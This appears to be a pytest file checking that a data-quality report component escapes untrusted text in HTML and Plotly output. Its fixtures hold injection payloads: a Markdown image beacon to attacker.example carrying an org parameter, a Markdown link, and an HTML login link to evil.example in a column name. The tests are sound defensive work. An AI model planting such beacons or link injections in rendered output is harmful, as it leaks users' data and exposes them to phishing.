"""Untrusted text rendered through HTML or Plotly stays inert (no Markdown or link injection)."""

from __future__ import annotations

import pytest

from components import quality_report

BEACON = "oops\n\n![p](https://attacker.example/beacon.png?org=acme)"


@pytest.fixture
def captured_markdown(monkeypatch) -> list[str]:
    calls: list[str] = []
    monkeypatch.setattr(quality_report.st, "markdown", lambda body, *a, **k: calls.append(str(body)))
    return calls


def _issue(**overrides) -> dict:
    issue = {
        "column": "amount",
        "message": f"Column 'amount' is 95.0% numeric (for example: {BEACON}).",
        "severity": "medium",
        "recommended_step": "Fix it\r\n\r\n[click](https://attacker.example/)",
    }
    issue.update(overrides)
    return issue


def test_issue_html_keeps_dataset_text_on_one_line():
    """SEC4: a blank line in a cell value must not end the issue's HTML block (CommonMark)."""
    for issue in (_issue(), _issue(column="a\n\nb", severity="x\n\ny")):
        block = quality_report._issue_html(issue, "vdas-issue-confirmed")
        assert "\n" not in block and "\r" not in block, block
        assert "attacker.example" in block  # the text is kept, only flattened and escaped
        assert "<img" not in block


def test_issues_view_html_blocks_have_no_line_breaks(captured_markdown):
    quality_report.issues_view([_issue()], [_issue(column="b\n\nc")])
    html_blocks = [b for b in captured_markdown if "vdas-issue" in b]
    assert any("attacker.example" in b for b in html_blocks)
    for block in html_blocks:
        assert "\n" not in block and "\r" not in block, block


def test_quality_header_status_stays_on_one_line(captured_markdown):
    quality_report.quality_header({"score": 80.0}, status="ok\n\n![p](https://attacker.example/x.png)")
    [score_html] = [b for b in captured_markdown if "vdas-score" in b]
    assert "\n" not in score_html and "attacker.example" in score_html


def test_missing_chart_escapes_column_names_for_plotly(monkeypatch):
    """SEC5: Plotly renders <a href> in tick labels, so header text must be HTML-escaped."""
    figures = []
    monkeypatch.setattr(quality_report.st, "plotly_chart", lambda fig, **k: figures.append(fig))
    link = '<a href="https://evil.example/login">Revenue</a>'
    quality_report.missing_chart(
        [{"name": link, "missing_pct": 40.0}, {"name": "%{y}", "missing_pct": 0.0}], key="m"
    )
    [figure] = figures
    labels = list(figure.data[0].x)
    assert all("<" not in str(label) for label in labels), labels
    assert labels[0] == '&lt;a href="https://evil.example/login"&gt;Revenue&lt;/a&gt;'
